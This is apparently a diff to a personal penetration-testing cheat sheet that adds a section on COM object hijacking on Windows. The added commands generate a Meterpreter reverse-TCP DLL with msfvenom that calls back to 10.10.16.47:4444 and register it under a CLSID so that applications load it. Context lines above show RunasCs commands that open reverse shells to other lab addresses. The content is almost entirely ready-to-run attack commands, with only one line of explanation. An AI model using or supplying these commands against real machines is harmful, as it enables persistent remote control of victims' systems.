@@ -220,3 +220,13 @@ net accounts
 .\RunasCs.exe <USER> <PASSWORD>  powershell.exe -r 10.10.14.84:6666
 .\RunasCS.exe /user:<DOMAIN>\<USER> <PASS>  powershell.exe (-r 10.10.16.48:6666)
 ```
+
+## powershell - find hijackable COM object
+```
+# find hijackable COM objects
+reg query HKCR\CLSID /s /f "FOO"
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.47 LPORT=4444 -f dll -o hack.dll
+reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\..." /ve /d "C:\tmp\hack.dll" /f
+# Windows applications often call COM components through the CLSID (Class ID), and the system loads the corresponding DLL or EXE according to the configuration in the registry. An attacker could: tamper with the registry key of an existing COM component to point to a malicious DLL. 
+```
